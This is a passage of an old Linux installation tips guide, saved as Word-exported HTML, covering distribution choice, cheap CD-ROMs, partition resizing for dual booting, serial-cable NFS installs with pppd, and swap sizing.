the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >most comfortable with. RedHat has the reputation of being very easy to install. They provide special tools to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >make the configuration easier. Debian also has some tools, but will usually require you to go on the command</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >line more often to configure the system. If you want to be on your own, and really learn how to edit</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >configuration files then Slackware is for you. The Web site </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.linux.org </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >lists all the available</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >distributions.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >In the end, the best person to decide which distribution you like, is yourself.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.2</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 2: How to find a Linux CD-ROM at low cost</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Linux market started from a few distributions available only from FTP servers, to full feature</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >commercial distributions available in stores and online including a printed manual and phone support.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here are the main choices you have when looking for a Linux distribution:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can download any Linux distribution from its FTP server. To take a few examples,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >RedHat can be downloaded from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >ftp://ftp.redhat.com</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >, Slackware from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >ftp://ftp.cdrom.com </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Debian from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >ftp://ftp.debian.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. That method is free, but requires you to have a fast Internet</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >connection. Downloading a full Linux distribution over a 56Kbps modem will take you quite a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >few hours.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >An other way is to buy a full distribution. RedHat, for example, can be bought online for about</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >$50. This will include a box, a CD-ROM, a boot diskette, a manual and support from RedHat.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The last way is to buy only the CD-ROM. There are a few places selling CD-ROMs of various</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >distributions for $2. One of them is </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.cheapbytes.com</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. You will only get the</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >CD-ROM, but this is all you need to install Linux if you are comfortable with the fact that you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >don't get a printed manual or free support. You can find the manual and other documentation</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >on the CD-ROM.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.3</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 3: Multiple operating systems</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A computer only needs one operating system to work. But what if you just want to try out a new system? Do</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you need to forget about the old one and erase your hard drive? No, you can have as many operating systems</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >on your computer as you wish.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux requires 2 partitions to work. Partitions are sections of the hard drive. When you install Linux, it will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >provide a program called fdisk or disk druid allowing you to create the needed partitions. The main problems</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >people have is that they don't have empty partitions to use for Linux, and they don't want to erase the current</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Windows or DOS partition. The trick is to resize your current partition to create empty space. Then you will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >be able to make the partitions needed by Linux to install properly.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Fdisk doesn't allow you to resize a partition. You will need to use another program to do the job, before using</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >fdisk to create the Linux partitions. A very popular commercial product to do this is Partition Magic from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.powerquest.com</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Let's see step by step what is needed to resize an existing partition to allow the creation of a new one for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Buy Partition Magic, or get any other tool that can safely resize partitions.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Make sure you have at least 150 megs free on your main partition, the required amount for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Resize the partitions so you have at least 150 megs free, outside of any current partition.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Reboot and launch the Linux installation.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Run fdisk or any partitioning program that comes with the Linux distribution, and follow the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >installation instructions to make the required Linux partitions.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.4</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >4: Installing with no CD-ROM drive or modem</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Most Linux distributions come on a CD-ROM. You can also download them from an FTP site, but that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >requires an Internet connection. What if you have a system with no CD-ROM drive or Internet connection,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >like an old 486 laptop? The trick here is to have another desktop system with a CD-ROM drive, and a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >null-modem serial cable.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >I will show you how to do it with Slackware. It is also possible with most other Linux distributions. Insert the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux CD-ROM in the drive on the desktop and copy the A (base) and N (networking) packages on diskettes.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You need at least those in order to use a serial cable to transfer the rest of the packages.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Now you need to enable NFS networking on the desktop, and allow the laptop to connect. You can give a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >temporary IP address to the laptop, like 192.168.1.11 that you need to add to your /etc/exports file on your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >desktop.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To link the two systems together, this is what you need to type on the laptop:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >/usr/sbin/pppd -detach crtscts lock 192.168.1.11:192.168.1.10 /dev/ttyS1 115200</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >And this on the PC:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >/usr/sbin/pppd -detach crtscts lock 192.168.1.10:192.168.1.11 /dev/ttyS1 115200</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This is assuming the cable is linked to ttyS1 (COM2) on both systems.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >With NFS, you can mount the CD-ROM drive remotely and tell the installation program to use a specific</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >path to install the remaining packages. Mount the CD-ROM with a command like this:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >mount -tnfs 192.168.1.10:/cdrom /mnt</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Then run the installation program:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >setup</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and enter the new path for the packages files.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.5</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 5: Swap and memory</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One important setting in any protected mode operating system like Linux is the swap space. In the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >installation, you will need to create a swap partition. A common question is what size should the partition be?</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The proper size depends on 2 things: The size of your hard drive and the size of your RAM memory. The less</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >RAM you have, the more swap you will need. Usually you will want to set your swap space size to be twice</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the RAM size, with a maximum of 128 megs. This of course requires you to have a hard drive with enough</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >free space to create such a partition.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you have 16 megs of RAM, making the swap space 32 megs or even 64 megs is very important. You will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >need it. If you have 128 megs of RAM on the other hand, you won't need much swap because the system will</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >already have 128 megs to fill before using swap space. So a swap partition of 128 megs or even 32 megs</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >could be enough.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you don't select enough swap, you may add more later.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.6</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 6: More swap with a swap file</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You installed a new Linux system, but forgot to set enough swap space for your needs. Do you need to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >repartition and reinstall? No, the swap utilities on Linux allow you to make a real file and use it as swap</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >space.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: 